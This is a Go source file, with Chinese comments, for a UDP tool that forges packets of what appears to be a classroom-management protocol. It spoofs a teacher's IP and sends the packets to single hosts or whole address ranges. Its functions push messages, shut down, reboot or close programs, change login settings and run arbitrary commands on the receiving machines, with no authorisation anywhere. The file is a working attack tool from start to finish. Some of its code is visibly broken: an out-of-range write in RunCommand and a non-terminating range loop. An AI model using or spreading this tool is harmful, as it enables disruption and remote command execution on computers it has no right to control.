//go:build windows

package main

import (
	"crypto/rand"
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"strings"
	"unicode/utf16"

	"golang.org/x/net/ipv4"
)

// UDP 客户端结构体
type UDPClient struct {
	TargetIP    string
	TargetPort  int
	TeacherIP   string
	Broadcast   bool
	conn        *net.UDPConn
	ipv4Handler *ipv4.PacketConn
}

// 创建新的 UDP 客户端
func NewUDPClient(targetIP string, targetPort int, teacherIP string, broadcast bool) *UDPClient {
	return &UDPClient{
		TargetIP:   targetIP,
		TargetPort: targetPort,
		TeacherIP:  teacherIP,
		Broadcast:  broadcast,
	}
}

// 连接到目标
func (c *UDPClient) Connect() (int, error) {
	udpAddr, err := net.ResolveUDPAddr("udp4", fmt.Sprintf("%s:%d", c.TargetIP, c.TargetPort))
	if err != nil {
		return 1, err
	}

	conn, err := net.DialUDP("udp4", nil, udpAddr)
	if err != nil {
		return 1, err
	}
	c.conn = conn

	// 启用广播
	if c.Broadcast {
		udpConn, err := net.ListenPacket("udp4", ":0")
		if err != nil {
			return 1, err
		}

		ipv4Conn := ipv4.NewPacketConn(udpConn)
		err = ipv4Conn.SetControlMessage(ipv4.FlagDst, true)
		if err != nil {
			return 1, err
		}
		err = ipv4Conn.SetMulticastTTL(2)
		if err != nil {
			return 1, err
		}
		c.ipv4Handler = ipv4Conn
	}

	return 0, nil
}

// 关闭连接
func (c *UDPClient) Close() {
	if c.conn != nil {
		c.conn.Close()
		c.conn = nil
	}
	if c.ipv4Handler != nil {
		c.ipv4Handler.Close()
		c.ipv4Handler = nil
	}
}

// 生成随机字节
func (c *UDPClient) generateRandomBytes(length int) ([]byte, error) {
	bytes := make([]byte, length)
	_, err := rand.Read(bytes)
	if err != nil {
		return nil, err
	}
	return bytes, nil
}

// 将 IP 地址转换为字节
func (c *UDPClient) ipToBytes(ipStr string) ([]byte, error) {
	ip := net.ParseIP(ipStr)
	if ip == nil {
		return nil, errors.New("invalid IP address")
	}
	ip = ip.To4()
	if ip == nil {
		return nil, errors.New("not an IPv4 address")
	}
	return []byte{ip[0], ip[1], ip[2], ip[3]}, nil
}

// 将字符串转换为 UTF-16LE 编码
func (c *UDPClient) stringToUTF16LE(s string) []byte {
	runes := []rune(s)
	utf16 := utf16.Encode(runes)
	bytes := make([]byte, len(utf16)*2)
	for i, v := range utf16 {
		binary.LittleEndian.PutUint16(bytes[i*2:], v)
	}
	return bytes
}

// 解析 IP 范围
func (c *UDPClient) parseIPRange(ipRange string) ([]string, error) {
	// CIDR
	if strings.Contains(ipRange, "/") {
		_, ipNet, err := net.ParseCIDR(ipRange)
		if err != nil {
			return nil, err
		}

		var ips []string
		for ip := ipNet.IP.Mask(ipNet.Mask); ipNet.Contains(ip); c.incrementIP(ip) {
			ips = append(ips, ip.String())
		}
		// 移除网络和广播地址
		if len(ips) > 2 {
			return ips[1 : len(ips)-1], nil
		}
		return ips, nil
	}

	// 通配符
	if strings.Contains(ipRange, "*") {
		base := strings.Split(ipRange, ".")
		var ips []string
		for i := 0; i < 256; i++ {
			for j := 0; j < 256; j++ {
				ip := fmt.Sprintf("%s.%s.%d.%d", base[0], base[1], i, j)
				ips = append(ips, ip)
			}
		}
		return ips, nil
	}

	// 范围
	if strings.Contains(ipRange, "-") {
		parts := strings.Split(ipRange, "-")
		if len(parts) != 2 {
			return nil, errors.New("invalid IP range format")
		}

		startIP := net.ParseIP(parts[0])
		endIP := net.ParseIP(parts[1])
		if startIP == nil || endIP == nil {
			return nil, errors.New("invalid IP address in range")
		}

		startIP = startIP.To4()
		endIP = endIP.To4()
		if startIP == nil || endIP == nil {
			return nil, errors.New("not an IPv4 address")
		}

		var ips []string
		for ip := make(net.IP, len(startIP)); ; c.incrementIP(ip) {
			copy(ip, startIP)
			ips = append(ips, ip.String())
			if ip.Equal(endIP) {
				break
			}
		}
		return ips, nil
	}

	// 单 IP
	return []string{ipRange}, nil
}

// 增加 IP 地址
func (c *UDPClient) incrementIP(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

// 发送数据包到指定目标
func (c *UDPClient) SendPacket(packet []byte) (int, error) {
	if c.conn == nil {
		return 1, errors.New("connection not established")
	}

	_, err := c.conn.Write(packet)
	if err != nil {
		return 1, err
	}

	return 0, nil
}

// 发送广播数据包
func (c *UDPClient) SendBroadcastPacket(packet []byte) (int, error) {
	if c.ipv4Handler == nil {
		return 1, errors.New("broadcast not enabled")
	}

	targets, err := c.parseIPRange(c.TargetIP)
	if err != nil {
		return 1, err
	}

	successCount := 0
	for _, target := range targets {
		udpAddr, err := net.ResolveUDPAddr("udp4", fmt.Sprintf("%s:%d", target, c.TargetPort))
		if err != nil {
			continue
		}

		_, err = c.ipv4Handler.WriteTo(packet, nil, udpAddr)
		if err != nil {
			continue
		}
		successCount++
	}

	if successCount == 0 {
		return 1, errors.New("failed to send to any target")
	}

	return 0, nil
}

// 发送消息数据包
func (c *UDPClient) SendMessage(message string) (int, error) {
	// 生成随机字节
	randomBytes, err := c.generateRandomBytes(16)
	if err != nil {
		return 1, err
	}
	teacherIPBytes, err := c.ipToBytes(c.TeacherIP)
	if err != nil {
		return 1, err
	}
	messageBytes := c.stringToUTF16LE(message)
	packet := make([]byte, 954) // 0x3BA
	copy(packet[0:4], []byte{0x44, 0x4d, 0x4f, 0x43})
	binary.LittleEndian.PutUint32(packet[4:8], 0x00000100)
	binary.LittleEndian.PutUint32(packet[8:12], 0x0000039e)
	copy(packet[12:28], randomBytes)
	binary.LittleEndian.PutUint32(packet[28:32], 0x00004e20)
	copy(packet[32:36], teacherIPBytes)
	binary.LittleEndian.PutUint32(packet[36:40], 0x00000391)
	binary.LittleEndian.PutUint32(packet[40:44], 0x00000391)
	binary.LittleEndian.PutUint32(packet[44:48], 0x00000800)
	binary.LittleEndian.PutUint32(packet[48:52], 0x00000000)
	binary.LittleEndian.PutUint32(packet[52:56], 0x00000005)
	copy(packet[56:56+len(messageBytes)], messageBytes)

	if c.Broadcast {
		return c.SendBroadcastPacket(packet)
	}
	return c.SendPacket(packet)
}
func (c *UDPClient) Shutdown() (int, error) {
	randomBytes, err := c.generateRandomBytes(16)
	if err != nil {
		return 1, err
	}
	teacherIPBytes, err := c.ipToBytes(c.TeacherIP)
	if err != nil {
		return 1, err
	}
	packet := make([]byte, 582) // 0x246
	copy(packet[0:4], []byte{0x44, 0x4d, 0x4f, 0x43})
	binary.LittleEndian.PutUint32(packet[4:8], 0x00000100)
	binary.LittleEndian.PutUint32(packet[8:12], 0x0000022a)
	copy(packet[12:28], randomBytes)
	binary.LittleEndian.PutUint32(packet[28:32], 0x00004e20)
	copy(packet[32:36], teacherIPBytes)
	binary.LittleEndian.PutUint32(packet[36:40], 0x0000021d)
	binary.LittleEndian.PutUint32(packet[40:44], 0x0000021d)
	binary.LittleEndian.PutUint32(packet[44:48], 0x00000200)
	binary.LittleEndian.PutUint32(packet[48:52], 0x00000000)
	binary.LittleEndian.PutUint32(packet[52:56], 0x10000014)
	binary.LittleEndian.PutUint32(packet[56:60], 0x0000000f)
	binary.LittleEndian.PutUint32(packet[60:64], 0x00000001)
	binary.LittleEndian.PutUint32(packet[64:68], 0x00000000)
	copy(packet[68:100], []byte{
		0x59, 0x65, 0x08, 0x5e, 0x06, 0x5c, 0x73, 0x51,
		0xed, 0x95, 0xa8, 0x60, 0x84, 0x76, 0xa1, 0x8b,
		0x97, 0x7b, 0x3a, 0x67, 0x02, 0x30, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	})
	if c.Broadcast {
		return c.SendBroadcastPacket(packet)
	}
	return c.SendPacket(packet)
}
func (c *UDPClient) Reboot() (int, error) {
	// 生成随机字节
	randomBytes, err := c.generateRandomBytes(16)
	if err != nil {
		return 1, err
	}
	teacherIPBytes, err := c.ipToBytes(c.TeacherIP)
	if err != nil {
		return 1, err
	}
	packet := make([]byte, 582) // 0x246
	copy(packet[0:4], []byte{0x44, 0x4d, 0x4f, 0x43})
	binary.LittleEndian.PutUint32(packet[4:8], 0x00000100)
	binary.LittleEndian.PutUint32(packet[8:12], 0x0000022a)
	copy(packet[12:28], randomBytes)
	binary.LittleEndian.PutUint32(packet[28:32], 0x00004e20)
	copy(packet[32:36], teacherIPBytes)
	binary.LittleEndian.PutUint32(packet[36:40], 0x0000021d)
	binary.LittleEndian.PutUint32(packet[40:44], 0x0000021d)
	binary.LittleEndian.PutUint32(packet[44:48], 0x00000200)
	binary.LittleEndian.PutUint32(packet[48:52], 0x00000000)
	binary.LittleEndian.PutUint32(packet[52:56], 0x10000013)
	binary.LittleEndian.PutUint32(packet[56:60], 0x0000000f)
	binary.LittleEndian.PutUint32(packet[60:64], 0x00000001)
	binary.LittleEndian.PutUint32(packet[64:68], 0x00000000)
	copy(packet[68:100], []byte{
		0x59, 0x65, 0x08, 0x5e, 0x06, 0x5c, 0xcd, 0x91,
		0x2f, 0x54, 0xa8, 0x60, 0x84, 0x76, 0xa1, 0x8b,
		0x97, 0x7b, 0x3a, 0x67, 0x02, 0x30, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	})
	if c.Broadcast {
		return c.SendBroadcastPacket(packet)
	}
	return c.SendPacket(packet)
}

// 发送关闭应用程序数据包
func (c *UDPClient) CloseApp() (int, error) {
	randomBytes, err := c.generateRandomBytes(16)
	if err != nil {
		return 1, err
	}
	teacherIPBytes, err := c.ipToBytes(c.TeacherIP)
	if err != nil {
		return 1, err
	}
	packet := make([]byte, 582) // 0x246
	copy(packet[0:4], []byte{0x44, 0x4d, 0x4f, 0x43})
	binary.LittleEndian.PutUint32(packet[4:8], 0x00000100)
	binary.LittleEndian.PutUint32(packet[8:12], 0x0000022a)
	copy(packet[12:28], randomBytes)
	binary.LittleEndian.PutUint32(packet[28:32], 0x00004e20)
	copy(packet[32:36], teacherIPBytes)
	binary.LittleEndian.PutUint32(packet[36:40], 0x0000021d)
	binary.LittleEndian.PutUint32(packet[40:44], 0x0000021d)
	binary.LittleEndian.PutUint32(packet[44:48], 0x00000200)
	binary.LittleEndian.PutUint32(packet[48:52], 0x00000000)
	binary.LittleEndian.PutUint32(packet[52:56], 0x10000002)
	binary.LittleEndian.PutUint32(packet[56:60], 0x0000000f)
	binary.LittleEndian.PutUint32(packet[60:64], 0x00000001)
	binary.LittleEndian.PutUint32(packet[64:68], 0x00000000)
	copy(packet[68:100], []byte{
		0x59, 0x65, 0x08, 0x5e, 0x06, 0x5c, 0x73, 0x51,
		0xed, 0x95, 0xa8, 0x60, 0x84, 0x76, 0x94, 0x5e,
		0x28, 0x75, 0x0b, 0x7a, 0x8f, 0x5e, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	})
	if c.Broadcast {
		return c.SendBroadcastPacket(packet)
	}
	return c.SendPacket(packet)
}

// 发送设置登录模式数据包
func (c *UDPClient) SetLoginMode(autoLogin bool, channelID int) (int, error) {
	if channelID < 1 || channelID > 32 {
		return 1, errors.New("channel ID must be between 1 and 32")
	}
	randomBytes, err := c.generateRandomBytes(16)
	if err != nil {
		return 1, err
	}
	teacherIPBytes, err := c.ipToBytes(c.TeacherIP)
	if err != nil {
		return 1, err
	}
	packet := make([]byte, 71) // 0x47
	copy(packet[0:4], []byte{0x44, 0x4d, 0x4f, 0x43})
	binary.LittleEndian.PutUint32(packet[4:8], 0x00000100)
	binary.LittleEndian.PutUint32(packet[8:12], 0x0000002f)
	copy(packet[12:28], randomBytes)
	binary.LittleEndian.PutUint32(packet[28:32], 0x00004e20)
	copy(packet[32:36], teacherIPBytes)
	binary.LittleEndian.PutUint32(packet[36:40], 0x00000022)
	binary.LittleEndian.PutUint32(packet[40:44], 0x00000022)
	binary.LittleEndian.PutUint32(packet[44:48], 0x00004000)
	binary.LittleEndian.PutUint32(packet[48:52], 0x00000000)
	binary.LittleEndian.PutUint32(packet[52:56], 0x00000007)
	binary.LittleEndian.PutUint32(packet[56:60], 0x00000015)
	binary.LittleEndian.PutUint32(packet[60:64], 0x00000000)
	if autoLogin {
		binary.LittleEndian.PutUint32(packet[64:68], 0x00000001)
	} else {
		binary.LittleEndian.PutUint32(packet[64:68], 0x00000000)
	}
	binary.LittleEndian.PutUint32(packet[68:72], uint32(channelID))
	packet[72] = 0x00
	packet[73] = 0x00
	packet[74] = 0x99

	if c.Broadcast {
		return c.SendBroadcastPacket(packet)
	}
	return c.SendPacket(packet)
}

// 发送执行命令数据包
func (c *UDPClient) RunCommand(command string) (int, error) {
	randomBytes, err := c.generateRandomBytes(16)
	if err != nil {
		return 1, err
	}
	teacherIPBytes, err := c.ipToBytes(c.TeacherIP)
	if err != nil {
		return 1, err
	}
	commandBytes := c.stringToUTF16LE(command)
	packet := make([]byte, 906) // 906字节 = 0x38A
	copy(packet[0:4], []byte{0x44, 0x4d, 0x4f, 0x43})
	binary.LittleEndian.PutUint32(packet[4:8], 0x00000100)
	binary.LittleEndian.PutUint32(packet[8:12], 0x0000036e)
	copy(packet[12:28], randomBytes)
	binary.LittleEndian.PutUint32(packet[28:32], 0x00004e20)
	copy(packet[32:36], teacherIPBytes)
	binary.LittleEndian.PutUint32(packet[36:40], 0x00000361)
	binary.LittleEndian.PutUint32(packet[40:44], 0x00000361)
	binary.LittleEndian.PutUint32(packet[44:48], 0x00000200)
	binary.LittleEndian.PutUint32(packet[48:52], 0x00000000)
	binary.LittleEndian.PutUint32(packet[52:56], 0x0000000f)
	binary.LittleEndian.PutUint32(packet[56:60], 0x00000001)
	copy(packet[60:60+len(commandBytes)], commandBytes)
	packet[902] = 0x01
	packet[906] = 0x01
	if c.Broadcast {
		return c.SendBroadcastPacket(packet)
	}
	return c.SendPacket(packet)
}

// 解析目标 IP 字符串
func ParseTargetIP(ipStr string) ([]string, error) {
	client := &UDPClient{}
	return client.parseIPRange(ipStr)
}
